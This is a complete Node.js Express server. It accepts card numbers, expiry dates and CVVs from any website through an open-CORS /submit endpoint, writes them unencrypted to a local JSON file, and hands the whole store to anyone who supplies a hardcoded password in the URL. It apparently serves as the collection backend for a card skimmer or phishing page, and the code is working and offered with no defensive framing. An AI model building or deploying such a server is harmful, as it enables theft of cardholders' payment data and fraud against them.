const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

app.use(cors());
app.use(express.json());

function readData() {
    try {
        const content = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(content);
    } catch (e) {
        return [];
    }
}

function writeData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// Accept card submissions
app.post('/submit', (req, res) => {
    const { cardNumber, expiry, cvv } = req.body;
    if (!cardNumber || !expiry || !cvv) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    const entry = { cardNumber, expiry, cvv, timestamp: new Date().toISOString() };
    const existing = readData();
    existing.push(entry);
    writeData(existing);
    res.json({ status: 'ok' });
});

// Provide stored data, protected by password
const PASSWORD = '27032011';
app.get('/data', (req, res) => {
    const pass = req.query.pass;
    if (pass !== PASSWORD) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    res.json(readData());
});

// Serve static client files
app.use(express.static(path.join(__dirname)));

app.listen(PORT, () => {
    console.log(`Server listening on http://localhost:${PORT}`);
});
